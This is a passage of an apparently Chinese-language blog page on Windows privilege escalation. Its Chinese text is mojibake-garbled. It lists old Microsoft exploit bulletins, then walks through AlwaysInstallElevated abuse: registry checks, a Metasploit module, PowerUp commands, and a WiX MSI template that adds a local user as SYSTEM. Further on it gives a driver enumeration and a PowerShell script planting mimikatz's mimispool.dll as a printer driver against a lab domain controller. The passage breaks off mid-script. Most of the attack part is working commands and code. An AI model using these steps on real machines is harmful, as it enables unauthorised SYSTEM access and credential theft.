  <li>MS15-076 ã€€[KB3067505]ã€€ã€€[RPC]ã€€ã€€(2003/2008/7/8/2012)</li>
  <li>MS15-077 ã€€[KB3077657]ã€€ã€€[ATM]ã€€ã€€(XP/Vista/Win7/Win8/2000/2003/2008/2012)</li>
  <li>MS15-061 ã€€[KB3057839]ã€€ã€€[Kernel Driver]ã€€ã€€(2003/2008/7/8/2012)</li>
  <li>MS15-051 ã€€[KB3057191]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(2003/2008/7/8/2012)</li>
  <li>MS15-015 ã€€[KB3031432]ã€€ã€€[Kernel Driver]ã€€ã€€(Win7/8/8.1/2012/RT/2012 R2/2008 R2)</li>
  <li>MS15-010 ã€€[KB3036220]ã€€ã€€[Kernel Driver]ã€€ã€€(2003/2008/7/8)</li>
  <li>MS15-001 ã€€[KB3023266]ã€€ã€€[Kernel Driver]ã€€ã€€(2008/2012/7/8)</li>
  <li>MS14-070 ã€€[KB2989935]ã€€ã€€[Kernel Driver]ã€€ã€€(2003)</li>
  <li>MS14-068 ã€€[KB3011780]ã€€ã€€[Domain Privilege Escalation]ã€€ã€€(2003/2008/2012/7/8)</li>
  <li>MS14-058 ã€€[KB3000061]ã€€ã€€[Win32k.sys]ã€€ã€€(2003/2008/2012/7/8)</li>
  <li>MS14-066 ã€€[KB2992611]ã€€ã€€[Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2- SP1/2012/2012 R2/Windows RT/Windows RT 8.1)</li>
  <li>MS14-040 ã€€[KB2975684]ã€€ã€€[AFD Driver]ã€€ã€€(2003/2008/2012/7/8)</li>
  <li>MS14-002 ã€€[KB2914368]ã€€ã€€[NDProxy]ã€€ã€€(2003/XP)</li>
  <li>MS13-053 ã€€[KB2850851]ã€€ã€€[win32k.sys]ã€€ã€€(XP/Vista/2003/2008/win 7)</li>
  <li>MS13-046 ã€€[KB2840221]ã€€ã€€[dxgkrnl.sys]ã€€ã€€(Vista/2003/2008/2012/7)</li>
  <li>MS13-005 ã€€[KB2778930]ã€€ã€€[Kernel Mode Driver]ã€€ã€€(2003/2008/2012/win7/8)</li>
  <li>MS12-042 ã€€[KB2972621]ã€€ã€€[Service Bus]ã€€ã€€(2008/2012/win7)</li>
  <li>MS12-020 ã€€[KB2671387]ã€€ã€€[RDP]ã€€ã€€(2003/2008/7/XP)</li>
  <li>MS11-080 ã€€[KB2592799]ã€€ã€€[AFD.sys]ã€€ã€€(2003/XP)</li>
  <li>MS11-062 ã€€[KB2566454]ã€€ã€€[NDISTAPI]ã€€ã€€(2003/XP)</li>
  <li>MS11-046 ã€€[KB2503665]ã€€ã€€[AFD.sys]ã€€ã€€(2003/2008/7/XP)</li>
  <li>MS11-011 ã€€[KB2393802]ã€€ã€€[kernel Driver]ã€€ã€€(2003/2008/7/XP/Vista)</li>
  <li>MS10-092 ã€€[KB2305420]ã€€ã€€[Task Scheduler]ã€€ã€€(2008/7)</li>
  <li>MS10-065 ã€€[KB2267960]ã€€ã€€[FastCGI]ã€€ã€€(IIS 5.1, 6.0, 7.0, and 7.5)</li>
  <li>MS10-059 ã€€[KB982799]ã€€ã€€ [ACL-Churraskito]ã€€ã€€(2008/7/Vista)</li>
  <li>MS10-048 ã€€[KB2160329]ã€€ã€€[win32k.sys]ã€€ã€€(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</li>
  <li>MS10-015 ã€€[KB977165]ã€€ã€€ [KiTrap0D]ã€€ã€€(2003/2008/7/XP)</li>
  <li>MS10-012 ã€€[KB971468]ã€€ã€€[SMB Client Trans2 stack overflow]ã€€ã€€(Windows 7/2008R2)</li>
  <li>MS09-050 ã€€[KB975517]ã€€ã€€ [Remote Code Execution]ã€€ã€€(2008/Vista)</li>
  <li>MS09-020 ã€€[KB970483]ã€€ã€€ [IIS 6.0]ã€€ã€€(IIS 5.1 and 6.0)</li>
  <li>MS09-012 ã€€[KB959454]ã€€ã€€ [Chimichurri]ã€€ã€€(Vista/win7/2008/Vista)</li>
  <li>MS08-068 ã€€[KB957097]ã€€ã€€ [Remote Code Execution]ã€€ã€€(2000/XP)</li>
  <li>MS08-067 ã€€[KB958644]ã€€ã€€ [Remote Code Execution]ã€€ã€€(Windows 2000/XP/Server 2003/Vista/Server 2008)</li>
  <li>MS08-066 ã€€[KB956803]ã€€ã€€ [AFD.sys]ã€€ã€€(Windows 2000/XP/Server 2003)</li>
  <li>MS08-025 ã€€[KB941693]ã€€ã€€ [Win32.sys]ã€€ã€€(XP/2003/2008/Vista)</li>
  <li>MS06-040 ã€€[KB921883]ã€€ã€€ [Remote Code Execution]ã€€ã€€(2003/xp/2000)</li>
  <li>MS05-039 ã€€[KB899588]ã€€ã€€ [PnP Service]ã€€ã€€(Win 9X/ME/NT/2000/XP/2003)</li>
  <li>MS03-026 ã€€[KB823980]ã€€ã€€ [Buffer Overrun In RPC Interface]ã€€ã€€(/NT/2000/XP/2003)</li>
</ul>

<h2 id="åˆ©ç”¨-microsoft-windows-installer-ææƒ">åˆ©ç”¨ Microsoft Windows Installer ææƒ</h2>
<h3 id="alwaysinstallelevated-æ³¨å†Œè¡¨é¡¹é”™è¯¯é…ç½®">AlwaysInstallElevated æ³¨å†Œè¡¨é¡¹é”™è¯¯é…ç½®</h3>

<p>windows æœ‰ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ MSIEXECï¼Œç”¨äºå®‰è£… Windows Installer å®‰è£…åŒ…ï¼ŒAlwaysInstallElevated æ˜¯ä¸€ä¸ªç»„ç­–ç•¥é…ç½®ï¼Œå¦‚æœå¯ç”¨ï¼Œé‚£ä¹ˆå°†å…è®¸æ™®é€šç”¨æˆ·ä»¥ SYSTEM æƒé™è¿è¡Œ msi æ–‡ä»¶è¿›è¡Œå®‰è£…ã€‚å¦‚æœå¯¹æ–¹æœºå™¨æ°å¥½å¼€å¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ­¤ç¼ºé™·ææƒã€‚</p>

<p>æ³¨å†Œè¡¨æŸ¥è¯¢, å¦‚æœä¸¤ä¸ªæŸ¥è¯¢éƒ½è¿”å›å€¼ 0x1ï¼Œåˆ™ä¸ºç”¨æˆ·å’Œè®¡ç®—æœºå¯ç”¨äº† AlwaysInstallElevatedï¼Œè¡¨æ˜ç³»ç»Ÿå®¹æ˜“å—åˆ°æ”»å‡»ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># shell</span>
reg query HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated

<span class="c"># ps</span>
Get-ItemProperty HKLM<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
Get-ItemProperty HKCU<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
</code></pre></div></div>

<p>æ¼æ´åˆ©ç”¨ï¼š
MSF çš„ exploit/windows/local/always_install_elevate æ¨¡å—å¯ä»¥è‡ªåŠ¨å®Œæˆææƒæ“ä½œï¼Œä¼šåˆ›å»ºä¸€ä¸ªéšæœºæ–‡ä»¶åçš„ msi æ–‡ä»¶ï¼Œå¹¶åœ¨ææƒæˆåŠŸååˆ é™¤æ­¤maiæ–‡ä»¶ï¼Œæ”»å‡»æˆåŠŸä¼šè¿”å› system æƒé™ä¼šè¯</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getuid
use exploit/windows/local/always_install_elevated
<span class="nb">set </span>session 4
run
</code></pre></div></div>
<p>PowerUP åˆ©ç”¨
æ£€æŸ¥æ³¨å†Œè¡¨çš„è®¾ç½®ï¼š</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&amp; {import-module .\powerup.ps1; get-registryalwaysinstallelevated}"</span><span class="w">
</span></code></pre></div></div>

<p>ç”Ÿæˆæ–°çš„è´¦æˆ·ï¼š</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&amp; {import-module .\powerup.ps1; write-useraddmsi}"</span><span class="w">
</span></code></pre></div></div>

<p>Metasploitå¯ä»¥ç”Ÿæˆ MSI ç±»å‹çš„è½½è·ï¼Œä½†å¾ˆå®¹æ˜“è¢« AV/EDR æ‰€æ£€æµ‹ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ›å»º MSI åŒ…è£¹æ–‡ä»¶ã€‚
æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…· wix (https://github.com/wixtoolset/wix3) æ¥å°†åŒ…å«äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è€…ä»»æ„å‘½ä»¤çš„æ¨¡æ¿ (https://github.com/KINGSABRI/MSI-AlwaysInstallElevated) è¿›è¡Œæ‰“åŒ…ç„¶åå®‰è£…ã€‚
æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†è¦è¿è¡Œçš„è½½è·æˆ–è€…å‘½ä»¤åŒ…å«åœ¨é‡Œé¢ï¼Œæˆ‘ä»¬å°è¯•æ‰§è¡Œæ·»åŠ æ–°ç”¨æˆ·çš„å‘½ä»¤ï¼Œæ¨¡æ¿å†…å®¹å¦‚ä¸‹ï¼š</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Wix</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/wix/2006/wi"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;Product</span> <span class="na">Id=</span><span class="s">"*"</span> <span class="na">UpgradeCode=</span><span class="s">"12345678-1234-1234-1234-111111111111"</span> <span class="na">Name=</span><span class="s">"23e23deeqwddeweqwde"</span> <span class="na">Version=</span><span class="s">"0.0.1"</span> <span class="na">Manufacturer=</span><span class="s">"Test1"</span> <span class="na">Language=</span><span class="s">"1033"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;Package</span> <span class="na">InstallerVersion=</span><span class="s">"200"</span> <span class="na">Compressed=</span><span class="s">"yes"</span> <span class="na">Comments=</span><span class="s">"Windows Installer Package"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Media</span> <span class="na">Id=</span><span class="s">'1'</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"TARGETDIR"</span> <span class="na">Name=</span><span class="s">"SourceDir"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"ProgramFilesFolder"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"INSTALLLOCATION"</span> <span class="na">Name=</span><span class="s">"Example"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;Component</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="na">Guid=</span><span class="s">"12345678-1234-1234-1234-222222222222"</span> <span class="na">KeyPath=</span><span class="s">"yes"</span><span class="nt">&gt;&lt;/Component&gt;</span>
                <span class="nt">&lt;/Directory&gt;</span>
            <span class="nt">&lt;/Directory&gt;</span>
        <span class="nt">&lt;/Directory&gt;</span>
        <span class="nt">&lt;Feature</span> <span class="na">Id=</span><span class="s">"DefaultFeature"</span> <span class="na">Level=</span><span class="s">"1"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;ComponentRef</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;/Feature&gt;</span>

        <span class="nt">&lt;CustomAction</span> 
            <span class="na">Id=</span><span class="s">"Shell"</span> 
            <span class="na">Execute=</span><span class="s">"deferred"</span>
            <span class="na">Directory=</span><span class="s">"TARGETDIR"</span> 
            <span class="na">Impersonate=</span><span class="s">"no"</span> 
            <span class="na">ExeCommand=</span><span class="s">"net user zhi 123.com /add"</span> 
            <span class="na">Return=</span><span class="s">"check"</span> 
        <span class="nt">/&gt;</span>

        <span class="nt">&lt;InstallExecuteSequence&gt;</span>
            <span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Shell"</span> <span class="na">After=</span><span class="s">"InstallFiles"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
        <span class="nt">&lt;/InstallExecuteSequence&gt;</span>
    <span class="nt">&lt;/Product&gt;</span>
<span class="nt">&lt;/Wix&gt;</span>
</code></pre></div></div>

<p>å°†è¯¥æ¨¡æ¿æ‰“åŒ…æˆ .msi æ–‡ä»¶ï¼š</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>candle zhi.wxs
light zhi.wixobj
</code></pre></div></div>

<p>æ­¤æ—¶å·²ç»ç”Ÿæˆäº†zhi.msiæ–‡ä»¶ï¼Œè¿è¡Œè¯¥æ–‡ä»¶å³å¯åˆ›å»ºç”¨æˆ·åä¸ºzhi</p>

<ul>
  <li><a href="http://uuzdaisuki.com/2021/06/09/AlwaysInstallElevated%E6%8F%90%E6%9D%83/#AlwaysInstallElevated%E6%8F%90%E6%9D%83">AlwaysInstallElevatedææƒ</a></li>
  <li><a href="https://www.cnblogs.com/JFSec/articles/17322189.html">æœ¬åœ°ä¾¦æ“¦ä¸ææƒ - JFSec - åšå®¢å›­</a></li>
</ul>

<h2 id="åˆ©ç”¨å­˜åœ¨æ¼æ´çš„é©±åŠ¨ææƒ">åˆ©ç”¨å­˜åœ¨æ¼æ´çš„é©±åŠ¨ææƒ</h2>
<p>æ¡ä»¶ï¼š</p>
<ul>
  <li>æ¼æ´</li>
  <li>å­˜åœ¨æ¼æ´çš„é©±åŠ¨</li>
</ul>

<p>æŸ¥çœ‹é©±åŠ¨ï¼š</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Swissky</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">driverquery.exe</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">table</span><span class="w"> </span><span class="nx">/si</span><span class="w">
</span><span class="kr">Module</span><span class="w"> </span><span class="n">Name</span><span class="w">  </span><span class="nx">Display</span><span class="w"> </span><span class="nx">Name</span><span class="w">           </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Type</span><span class="w">   </span><span class="nx">Link</span><span class="w"> </span><span class="nx">Date</span><span class="w">
</span><span class="o">============</span><span class="w"> </span><span class="o">======================</span><span class="w"> </span><span class="o">=============</span><span class="w"> </span><span class="o">======================</span><span class="w">
</span><span class="mi">1394</span><span class="n">ohci</span><span class="w">     </span><span class="nx">1394</span><span class="w"> </span><span class="nx">OHCI</span><span class="w"> </span><span class="nx">Compliant</span><span class="w"> </span><span class="nx">Ho</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/10/2006</span><span class="w"> </span><span class="nx">4:44:38</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="mi">3</span><span class="n">ware</span><span class="w">        </span><span class="nx">3ware</span><span class="w">                  </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">5/18/2015</span><span class="w"> </span><span class="nx">6:28:03</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">ACPI</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Driver</span><span class="w">  </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/9/1975</span><span class="w"> </span><span class="nx">6:17:08</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">AcpiDev</span><span class="w">      </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Devices</span><span class="w"> </span><span class="nx">driver</span><span class="w">    </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/7/1993</span><span class="w"> </span><span class="nx">6:22:19</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">acpiex</span><span class="w">       </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">ACPIEx</span><span class="w"> </span><span class="nx">Drive</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">3/1/2087</span><span class="w"> </span><span class="nx">8:53:50</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">acpipagr</span><span class="w">     </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Processor</span><span class="w"> </span><span class="nx">Aggrega</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">1/24/2081</span><span class="w"> </span><span class="nx">8:36:36</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">AcpiPmi</span><span class="w">      </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Power</span><span class="w"> </span><span class="nx">Meter</span><span class="w"> </span><span class="nx">Drive</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">11/19/2006</span><span class="w"> </span><span class="nx">9:20:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">acpitime</span><span class="w">     </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Wake</span><span class="w"> </span><span class="nx">Alarm</span><span class="w"> </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">2/9/1974</span><span class="w"> </span><span class="nx">7:10:30</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">ADP80XX</span><span class="w">      </span><span class="nx">ADP80XX</span><span class="w">                </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">4/9/2015</span><span class="w"> </span><span class="nx">4:49:48</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>
<p>å¯¹æ¯”å­˜åœ¨æ¼æ´çš„é©±åŠ¨ï¼š</p>
<ul>
  <li><a href="https://www.loldrivers.io/">LOLDrivers</a></li>
</ul>

<h2 id="åˆ©ç”¨æ‰“å°æœºææƒ">åˆ©ç”¨æ‰“å°æœºææƒ</h2>
<h3 id="å°†-mimikatz-æ·»åŠ ä¸ºè™šæ‹Ÿæ‰“å°æœº">å°† mimikatz æ·»åŠ ä¸ºè™šæ‹Ÿæ‰“å°æœº</h3>
<p>Create a Printer</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$printerName</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="s1">'Universal Priv Printer'</span><span class="w">
</span><span class="nv">$system32</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">systemroot</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\system32'</span><span class="w">
</span><span class="nv">$drivers</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\spool\drivers'</span><span class="w">
</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$printerName</span><span class="w">
 
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\mscms.dll'</span><span class="p">)</span><span class="w">             </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\mimispool.dll'</span><span class="p">)</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'.\mimikatz_trunk\x64\mimispool.dll'</span><span class="w">   </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$drivers</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="s1">'\x64\3\mimispool.dll'</span><span class="p">)</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'.\mimikatz_trunk\win32\mimispool.dll'</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$drivers</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="s1">'\W32X86\3\mimispool.dll'</span><span class="p">)</span><span class="w">
 
</span><span class="n">Add-PrinterDriver</span><span class="w"> </span><span class="nt">-Name</span><span class="w">       </span><span class="s1">'Generic / Text Only'</span><span class="w">
</span><span class="n">Add-Printer</span><span class="w">       </span><span class="nt">-DriverName</span><span class="w"> </span><span class="s1">'Generic / Text Only'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$printerName</span><span class="w"> </span><span class="nt">-PortName</span><span class="w"> </span><span class="s1">'FILE:'</span><span class="w"> </span><span class="nt">-Shared</span><span class="w">
 
</span><span class="n">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles'</span><span class="p">)</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'x64\3'</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s1">'mimispool.dll'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mscms.dll'</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'W32X86\3'</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s1">'mimispool.dll'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mscms.dll'</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="bp">$null</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="bp">$null</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mimispool.dll'</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span></code></pre></div></div>
<p>Execute the driver</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$serverName</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s1">'dc.purple.lab'</span><span class="w">
</span><span class="nv">$printerName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Universal Priv Printer'</span><span class="w">
